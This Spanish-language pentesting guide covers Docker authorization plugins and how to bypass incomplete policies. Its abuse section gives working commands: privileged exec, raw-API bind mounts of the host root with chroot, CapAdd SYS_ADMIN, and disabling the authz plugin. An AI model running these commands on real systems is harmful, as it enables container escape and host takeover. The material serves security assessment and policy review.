# Plugins de autorización en Runtime

## Overview

Los plugins de autorización en Runtime son una capa de políticas adicional que decide si un caller puede realizar una acción determinada del daemon. Docker es el ejemplo clásico. Por defecto, cualquiera que pueda comunicarse con el daemon de Docker tiene, en la práctica, un control amplio sobre él. Los plugins de autorización intentan restringir este modelo examinando el usuario autenticado y la operación de API solicitada, y luego permitiendo o denegando la solicitud según la política.

Este tema merece su propia página porque cambia el modelo de explotación cuando un atacante ya tiene acceso a una API de Docker o a un usuario del grupo `docker`. En estos entornos, la pregunta ya no es solo "¿puedo alcanzar el daemon?", sino también "¿el daemon está protegido por una capa de autorización y, de ser así, se puede bypass mediante endpoints no gestionados, un análisis débil de JSON o permisos de administración de plugins?"

## Operation

Cuando una solicitud llega al daemon de Docker, el subsistema de autorización puede pasar el contexto de la solicitud a uno o más plugins instalados. El plugin ve la identidad del usuario autenticado, los detalles de la solicitud, determinados headers y partes del body de la solicitud o respuesta cuando el content type es adecuado. Se pueden encadenar varios plugins, y el acceso solo se concede si todos los plugins permiten la solicitud.

Este modelo parece sólido, pero su seguridad depende por completo de hasta qué punto el autor de la política comprendió la API. Un plugin que bloquea `docker run --privileged` pero ignora `docker exec`, no contempla claves JSON alternativas como `Binds` de nivel superior o permite la administración de plugins puede crear una falsa sensación de restricción y, aun así, dejar abiertas rutas directas de privilege escalation.

## Common Plugin Targets

Las áreas importantes para revisar las políticas son:

- endpoints de creación de containers
- campos de `HostConfig` como `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` y las opciones de sharing de namespaces
- comportamiento de `docker exec`
- endpoints de administración de plugins
- cualquier endpoint que pueda activar indirectamente acciones de Runtime fuera del modelo de políticas previsto

Históricamente, ejemplos como el plugin `authz` de Twistlock y plugins educativos sencillos como `authobot` facilitaban el estudio de este modelo, porque sus archivos de políticas y rutas de código mostraban cómo se implementaba realmente el mapeo entre endpoints y acciones. Para los trabajos de assessment, la lección importante es que el autor de la política debe comprender toda la superficie de la API, no solo los comandos de CLI más visibles.

## Abuse

El primer objetivo es averiguar qué está realmente bloqueado. Si el daemon deniega una acción, el error suele hacer leak del nombre del plugin, lo que ayuda a identificar el control utilizado:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Si necesitas un perfilado más amplio de los endpoints, herramientas como `docker_auth_profiler` son útiles porque automatizan la tarea, normalmente repetitiva, de comprobar qué rutas de la API y estructuras JSON están realmente permitidas por el plugin.

Si el entorno utiliza un plugin personalizado y puedes interactuar con la API, enumera qué campos de los objetos se filtran realmente:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Estas comprobaciones son importantes porque muchos fallos de autorización son específicos de un campo y no de un concepto. Un plugin puede rechazar un patrón de CLI sin bloquear por completo la estructura de API equivalente.

### Ejemplo completo: `docker exec` añade privilegios después de la creación del contenedor

Una política que bloquea la creación de contenedores privilegiados, pero permite la creación de contenedores `unconfined` junto con `docker exec`, todavía puede evadirse:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Si el daemon acepta el segundo paso, el usuario ha recuperado un proceso interactivo privilegiado dentro de un container que el autor de la policy creía restringido.

### Ejemplo completo: Bind Mount mediante la API sin procesar

Algunas policies defectuosas inspeccionan solo una forma de JSON. Si el bind mount del root filesystem no se bloquea de forma coherente, el host aún puede montarse:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
La misma idea también puede aparecer en `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
El impacto es un escape completo del sistema de archivos del host. El detalle interesante es que el bypass se debe a una cobertura incompleta de la policy, no a un bug del kernel.

### Ejemplo completo: atributo de capability sin comprobar

Si la policy olvida filtrar un atributo relacionado con una capability, el atacante puede crear un contenedor que recupere una capability peligrosa:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Una vez que `CAP_SYS_ADMIN` o una capability de fuerza similar está presente, muchas técnicas de breakout descritas en [capabilities.md](protections/capabilities.md) y [privileged-containers.md](privileged-containers.md) pasan a estar disponibles.

### Ejemplo completo: deshabilitar el plugin

Si se permiten las operaciones de gestión de plugins, el bypass más limpio puede ser desactivar completamente el control:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Este es un fallo de política en el nivel del plano de control. La capa de autorización existe, pero el usuario al que debía restringir todavía conserva permisos para deshabilitarla.

## Comprobaciones

Estos comandos tienen como objetivo identificar si existe una capa de políticas y si parece completa o superficial.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Qué es interesante aquí:

- Los mensajes de denegación que incluyen el nombre de un plugin confirman la existencia de una capa de autorización y a menudo revelan la implementación exacta.
- Una lista de plugins visible para el atacante puede ser suficiente para descubrir si es posible realizar operaciones de desactivación o reconfiguración.
- Una policy que bloquea únicamente acciones CLI obvias, pero no las solicitudes API directas, debe considerarse bypassable hasta que se demuestre lo contrario.

## Valores predeterminados del runtime

| Runtime / plataforma | Estado predeterminado | Comportamiento predeterminado | Debilitamiento manual común |
| --- | --- | --- | --- |
| Docker Engine | No habilitado de forma predeterminada | El acceso al daemon es efectivamente de todo o nada, a menos que se configure un plugin de autorización | policy de plugin incompleta, blacklists en lugar de allowlists, permitir la gestión de plugins, puntos ciegos a nivel de campo |
| Podman | No existe un equivalente directo común | Podman normalmente depende más de los permisos de Unix, la ejecución rootless y las decisiones sobre la exposición de la API que de los plugins de autorización al estilo de Docker | exponer ampliamente una API de Podman rootful, permisos débiles del socket |
| containerd / CRI-O | Modelo de control diferente | Estos runtimes normalmente dependen de los permisos del socket, los límites de confianza del nodo y los controles del orchestrator en capas superiores, en lugar de los plugins de autorización de Docker | montar el socket en workloads, asumir límites de confianza débiles a nivel local del nodo |
| Kubernetes | Usa authn/authz en las capas del API-server y kubelet, no plugins de autorización de Docker | El RBAC del cluster y los admission controls son la principal capa de policy | RBAC demasiado amplio, policy de admisión débil, exponer directamente las API del kubelet o del runtime |

{{#include ../../../banners/hacktricks-training.md}}
